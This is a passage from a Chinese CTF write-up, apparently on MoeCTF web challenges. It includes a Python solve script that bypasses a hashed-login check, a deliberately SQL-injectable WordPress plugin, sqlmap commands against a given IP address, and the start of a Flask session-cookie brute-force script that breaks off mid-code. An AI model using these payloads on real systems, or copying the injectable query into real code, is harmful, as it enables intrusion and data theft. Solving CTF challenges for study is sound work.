XV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXSshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyhbXStbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKCFbXStbXSlbIStbXSshIVtdXSsoW10re30pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSkpWyErW10rISFbXSshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0pKCErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKChbXSt7fSlbK1tdXSlbK1tdXSsoIStbXSshIVtdKyEhW10rW10pKyhbXVtbXV0rW10pWyErW10rISFbXV0pKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXSt7fSlbKyEhW11dKygre30rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSkKICAgICAgICB2YXIgXzB4ZGI1ND1bJ3N0cmluZ2lmeScsJ2xvZycsJ3Bhc3N3b3JkJywnL2xvZ2luJywnUE9TVCcsJ2dldEVsZW1lbnRCeUlkJywndGhlbiddO3ZhciBfMHg0ZTVhPWZ1bmN0aW9uKF8weGRiNTRmYSxfMHg0ZTVhOTQpe18weGRiNTRmYT1fMHhkYjU0ZmEtMHgwO3ZhciBfMHg0ZDhhNDQ9XzB4ZGI1NFtfMHhkYjU0ZmFdO3JldHVybiBfMHg0ZDhhNDQ7fTt3aW5kb3dbJ2FwaV9iYXNlJ109Jyc7ZnVuY3Rpb24gbG9naW4oKXtjb25zb2xlW18weDRlNWEoJzB4MScpXSgnbG9naW4nKTt2YXIgXzB4NWYyYmViPWRvY3VtZW50W18weDRlNWEoJzB4NScpXSgndXNlcm5hbWUnKVsndmFsdWUnXTt2YXIgXzB4NGZkMjI2PWRvY3VtZW50W18weDRlNWEoJzB4NScpXShfMHg0ZTVhKCcweDInKSlbJ3ZhbHVlJ107dmFyIF8weDFjNjFkOT1KU09OW18weDRlNWEoJzB4MCcpXSh7J3VzZXJuYW1lJzpfMHg1ZjJiZWIsJ3Bhc3N3b3JkJzpfMHg0ZmQyMjZ9KTt2YXIgXzB4MTBiOThlPXsncGFyYW1zJzphdG9iKGF0b2IoYXRvYihhdG9iKGF0b2IoXzB4MWM2MWQ5KSkpKSl9O2ZldGNoKHdpbmRvd1snYXBpX2Jhc2UnXStfMHg0ZTVhKCcweDMnKSx7J21ldGhvZCc6XzB4NGU1YSgnMHg0JyksJ2JvZHknOkpTT05bXzB4NGU1YSgnMHgwJyldKF8weDEwYjk4ZSl9KVtfMHg0ZTVhKCcweDYnKV0oZnVuY3Rpb24oXzB4Mjk5ZDRkKXtjb25zb2xlW18weDRlNWEoJzB4MScpXShfMHgyOTlkNGQpO30pO30KICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgogICAgPGgxPmV6U2lnbmluPC9oMT4KICAgIDxwPlNpZ24gaW4gdG8geW91ciBhY2NvdW50PC9wPgogICAgPHA+ZGVmYXVsdCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgaXMgYWRtaW4gYWRtaW48L3A+CiAgICA8cD5Hb29kIEx1Y2shPC9wPgoKICAgIDxwPgogICAgICAgIHVzZXJuYW1lIDxpbnB1dCBpZD0idXNlcm5hbWUiPgogICAgPC9wPgogICAgPHA+CiAgICAgICAgcGFzc3dvcmQgPGlucHV0IGlkPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiPgogICAgPC9wPgogICAgPGJ1dHRvbiBpZCA9ICJsb2dpbiI+CiAgICAgICAgTG9naW4KICAgIDwvYnV0dG9uPgo8L2JvZHk+CjxzY3JpcHQ+CiAgICBjb25zb2xlLmxvZygiaGVsbG8/IikKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2dpbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgbG9naW4pOwo8L3NjcmlwdD4KPC9odG1sPg=="</span><span class="token punctuation">)</span>        <span class="token keyword">class</span> <span class="token class-name">MyHandler</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>server<span class="token punctuation">.</span>BaseHTTPRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">do_GET</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> self<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/"</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>__page__<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"404 Not Found"</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"500 Internal Server Error"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">do_POST</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> self<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/login"</span><span class="token punctuation">:</span>                body <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Content-Length"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                payload <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>body<span class="token punctuation">)</span>                params <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>decrypt<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token string">"params"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span>                <span class="token keyword">if</span> params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>                    self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                    self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"YOU CANNOT LOGIN AS ADMIN!"</span><span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span>                <span class="token keyword">if</span> params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token operator">==</span> params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>                    self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                    self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!"</span><span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"same"</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span>                hashed <span class="token operator">=</span> gethash<span class="token punctuation">(</span>params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">for</span> k<span class="token punctuation">,</span>v <span class="token keyword">in</span> hashed_users<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> hashed <span class="token operator">==</span> v<span class="token punctuation">:</span>                        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                            <span class="token string">"user"</span><span class="token punctuation">:</span>k<span class="token punctuation">,</span>                            <span class="token string">"hash"</span><span class="token punctuation">:</span>hashed<span class="token punctuation">,</span>                            <span class="token string">"flag"</span><span class="token punctuation">:</span> FLAG <span class="token keyword">if</span> k <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token keyword">else</span> <span class="token string">"flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;"</span>                        <span class="token punctuation">&#125;</span>                        self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>                        self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                        self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>                        <span class="token keyword">return</span>                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"Invalid username or password"</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"404 Not Found"</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"500 Internal Server Error"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    server <span class="token operator">=</span> http<span class="token punctuation">.</span>server<span class="token punctuation">.</span>HTTPServer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">,</span> MyHandler<span class="token punctuation">)</span>    server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class="language-none"><code class="language-none">assert users[&quot;admin&quot;] &#x3D;&#x3D; &quot;admin&quot;users中存在用户名“admin”密码也为“admin”，表面上看需要传入的参数也为admin&#x2F;admin。</code></pre><p><a href="https://camo.githubusercontent.com/0a648064995f3f6282f0a6c04c149962353990ed8114498c12c0c2bef34b498f/68747470733a2f2f67697465652e636f6d2f776f646939386b2f636e626c6f6773696d616765732f7261772f6d61737465722f696d672f696d6167652d32303233303930373231303232323831372e706e67"><img src="https://camo.githubusercontent.com/0a648064995f3f6282f0a6c04c149962353990ed8114498c12c0c2bef34b498f/68747470733a2f2f67697465652e636f6d2f776f646939386b2f636e626c6f6773696d616765732f7261772f6d61737465722f696d672f696d6167652d32303233303930373231303232323831372e706e67" alt="image-20230907210222817" loading="lazy"></a></p><p>继续分析源码可以发现eval()语句将base64.b64encode覆写为base64.b64decode</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gethash</span><span class="token punctuation">(</span><span class="token operator">*</span>items<span class="token punctuation">)</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>        <span class="token keyword">if</span> item <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        c <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>item<span class="token punctuation">&#125;</span></span><span class="token string">]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span> <span class="token comment"># it looks so complex! but is it safe enough?</span>    <span class="token keyword">return</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token comment">#当传入的参数items为2个时该函数等价于求两个参数的异或值并返回，所以当两个参数相等时不管该参数为何值，返回值都为0</span><span class="token comment">#而传入参数有两个过滤，username不能等于“admin”，且username不能等于password，而拿到flag需要hashed值为0，怎么才能做到呢？</span></code></pre><p><strong>而传入参数有两个过滤，username不能等于“admin”，且username不能等于password，而拿到flag需要hashed值为0，怎么才能做到呢？</strong></p><p>接下来编写脚本即可把构造的json数据base64编码五次</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64url <span class="token operator">=</span> <span class="token string">"http://localhost:5946/login"</span>username <span class="token operator">=</span> <span class="token string">"\"1\""</span>password <span class="token operator">=</span> <span class="token string">"1"</span>jsondata <span class="token operator">=</span> <span class="token string">"&#123;\"username\":"</span><span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token operator">+</span><span class="token string">",\"password\":"</span><span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>password<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token operator">+</span><span class="token string">"&#125;"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>jsondata <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    jsondata <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>jsondata<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token string">"&#123;\"params\":\""</span><span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>jsondata<span class="token punctuation">&#125;</span></span><span class="token string">\""</span></span><span class="token operator">+</span><span class="token string">"&#125;"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>data <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>req <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre><h4 id="出去旅游的心海"><a href="#出去旅游的心海" class="headerlink" title="出去旅游的心海"></a>出去旅游的心海</h4><p>查看源码页面可发现一个php文件链接</p><p><img src="%E5%BF%83%E6%B5%B71.png" loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*Plugin Name: Visitor auto recorderDescription: Automatically record visitor's identification, still in development, do not use in industry environment!Author: KoKoMi  Still in development! :)*/</span><span class="token comment">// 不许偷看！这些代码我还在调试呢！</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 加载数据库配置，暂时用硬编码绝对路径</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/var/www/html/wordpress/'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'wp-config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$db_user</span> <span class="token operator">=</span> <span class="token constant">DB_USER</span><span class="token punctuation">;</span> <span class="token comment">// 数据库用户名</span><span class="token variable">$db_password</span> <span class="token operator">=</span> <span class="token constant">DB_PASSWORD</span><span class="token punctuation">;</span> <span class="token comment">// 数据库密码</span><span class="token variable">$db_name</span> <span class="token operator">=</span> <span class="token constant">DB_NAME</span><span class="token punctuation">;</span> <span class="token comment">// 数据库名称</span><span class="token variable">$db_host</span> <span class="token operator">=</span> <span class="token constant">DB_HOST</span><span class="token punctuation">;</span> <span class="token comment">// 数据库主机</span><span class="token comment">// 我记得可以用wp提供的global $wpdb来操作数据库，等旅游回来再研究一下</span><span class="token comment">// 这些是临时的代码</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$user_agent</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user_agent'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'time'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$db_host</span><span class="token punctuation">,</span> <span class="token variable">$db_user</span><span class="token punctuation">,</span> <span class="token variable">$db_password</span><span class="token punctuation">,</span> <span class="token variable">$db_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 检查连接是否成功</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_errno</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'数据库连接失败: '</span> <span class="token operator">.</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO visitor_records (ip, user_agent, time) VALUES ('<span class="token interpolation"><span class="token variable">$ip</span></span>', '<span class="token interpolation"><span class="token variable">$user_agent</span></span>', <span class="token interpolation"><span class="token variable">$time</span></span>)"</span><span class="token punctuation">;</span><span class="token comment">// 执行插入</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 检查插入是否成功</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'数据插入成功'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'数据插入失败: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 关闭数据库连接</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//gpt真好用</span></span></code></pre><p><img src="%E5%BF%83%E6%B5%B72.png" loading="lazy"></p><p>根据测试发现time存在报错注入</p><p><img src="%E5%BF%83%E6%B5%B73.png" loading="lazy"></p><p>sqlmap一把梭</p><pre class="language-sql" data-language="sql"><code class="language-sql">python3 sqlmap<span class="token punctuation">.</span>py  <span class="token operator">-</span>u <span class="token string">"http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"</span>  <span class="token comment">--data "time=1"  --dbs  --batch</span>python3 sqlmap<span class="token punctuation">.</span>py  <span class="token operator">-</span>u <span class="token string">"http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"</span>  <span class="token comment">--data "time=1"  -D wordpress --tables --batch</span>python3 sqlmap<span class="token punctuation">.</span>py  <span class="token operator">-</span>u <span class="token string">"http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"</span>  <span class="token comment">--data "time=1"  -D wordpress  -T secret_of_kokomi --columns --batch</span></code></pre><h4 id="moeworld"><a href="#moeworld" class="headerlink" title="moeworld"></a>moeworld</h4><p>首先爆破secret key</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertools<span class="token keyword">import</span> zlib<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> SecureCookieSessionInterface<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> base64_decode<span class="token comment">#https://github.com/noraj/flask-session-cookie-manager</span><span class="token keyword">class</span> <span class="token class-name">MockApp</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> secret_key<span class="token punctuation">)</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secret_key<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>secret_key<span class="token punctuation">,</span> session_cookie_structure<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">try</span><span class="token punctuation">:</span>app <span class="token operator">=</span> MockApp<span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span>session_cookie_structure <span class="token operator">=</span> session_cookie_structuresi <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span>s <span class="token operator">=</span> si<span class="token punctuation">.</span>get_signing_serializer<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token keyword">return</span> s<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>session_cookie_structure<span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">"[Encoding error] &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>session_cookie_value<span class="token punctuation">,</span> secret_key<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> <span class="token punctuation">(</span>secret_key <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>compressed <span class="token operator">=</span> <span class="token boolean">False</span>payload <span class="token operator">=</span> session_cookie_value<span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>compressed <span class="token operator">=</span> <span class="token boolean">True</span>payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>data <span class="token operator">=</span> payload<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>data <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> compressed<span class="token punctuation">:</span>data <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">return</span> data<span class="token keyword">else</span><span class="token punctuation">:</span>app <span class="token operator">=</span> MockApp<span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span>si <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span>s <span class="token operator">=</span> si<span class="token punctuation">.</span>get_signing_serializer<span class="token 